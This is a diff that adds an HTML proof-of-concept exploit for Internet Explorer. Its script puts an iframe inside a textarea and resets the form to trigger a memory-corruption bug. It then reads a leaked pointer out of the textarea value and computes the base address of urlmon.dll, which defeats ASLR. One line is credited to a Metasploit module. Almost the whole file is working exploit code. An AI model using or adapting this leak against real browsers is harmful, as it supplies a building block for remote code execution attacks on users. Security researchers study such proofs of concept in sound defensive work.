@@ -1,0 +1,42 @@
+<!-- saved from url=(0014)about:internet -->
+<script>
+
+function run() {
+  var textarea = document.getElementById("textarea");
+  var frame = document.createElement("iframe");
+
+  textarea.appendChild(frame);
+  frame.contentDocument.onreadystatechange = eventhandler;
+  form.reset();
+}
+
+function eventhandler() {
+  document.getElementById("textarea").defaultValue = "foo";
+
+  var x = document.createElement("INPUT");
+  x.setAttribute("type", "range"); // This one leaks urlmon
+
+}
+
+</script>
+<body onload=run()>
+<form id="form">
+<textarea id="textarea" cols="80">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</textarea>  <!-- Leak to URLMON.dll -->
+<!-- <textarea id="textarea" style="display:none" cols="80">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</textarea> --> <!-- Remove to hide textarea -->
+<br><br>
+<input id="clickMe" type="button" value="Get Leaked Address" onclick="printLeak();" />
+
+<script>
+
+function printLeak() {
+
+	var text = document.getElementById("textarea"); 	// Getting the swapped element
+	var leak = text.value.substring(0,2);				// Grabbing index[0:2]
+	var hex = parseInt(leak.charCodeAt(1).toString(16) + leak.charCodeAt().toString(16), 16);
+	// parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 ) 
+ 	// Above line lifted on April 20th, 2017 from: 
+	// https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/ms13_037_svg_dashstyle.rb
+	base_address = hex - 0x4504
+	text.value = "Leaked address: 0x"+ base_address.toString(16) + " - urlmon!CSecurityManager::`vftable'";
+}
+</script>
